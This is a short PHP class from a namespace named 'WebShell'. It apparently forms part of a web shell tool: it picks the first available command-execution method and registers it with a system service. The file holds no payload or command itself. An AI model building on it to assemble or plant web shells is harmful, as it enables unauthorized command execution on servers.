<?php
namespace WebShell;

class IdentifyExecutionAlternativesStep implements Step
{
    private $executionMethods;

    public function __construct(array $executionMethods)
    {
        $this->executionMethods = $executionMethods;
    }

    public function run(): void
    {
        // Attempt to identify a valid execution method
        $found = false;

        // Loop until a valid execution method is found
        for ($i = 0; $i < sizeof($this->executionMethods) && !$found; $i++) {
            if ($this->executionMethods[$i]->isAvailable()) {
                SystemService::getInstance()->setExecutionMethod($this->executionMethods[$i]);
                $found = true;
            }
        }
    }
}
?>
